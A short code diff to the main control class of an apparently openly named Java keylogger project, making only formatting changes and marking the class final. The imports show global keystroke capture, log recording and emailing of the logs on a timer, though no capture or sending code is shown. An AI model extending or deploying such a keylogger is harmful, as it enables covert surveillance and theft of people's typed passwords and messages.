@@ -5,14 +5,16 @@ import com.mossad.keylogger.logging.LogRecorder;
 import com.mossad.keylogger.mail.MailSender;
 import com.mossad.keylogger.reader.KeyReader;
 import com.mossad.keylogger.timer.WriterTask;
+
 import java.util.List;
 import java.util.Timer;
 import java.util.logging.Logger;
+
 import org.apache.commons.mail.EmailException;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 
-public class LogicFlow {
+public final class LogicFlow {
 
     private final Logger LOG = Logger.getLogger(LogicFlow.class.getCanonicalName());
     private Timer timer;
@@ -44,5 +46,3 @@ public class LogicFlow {
         timer.schedule(writerTask, 1000L, 10000L);
     }
 }
-
-
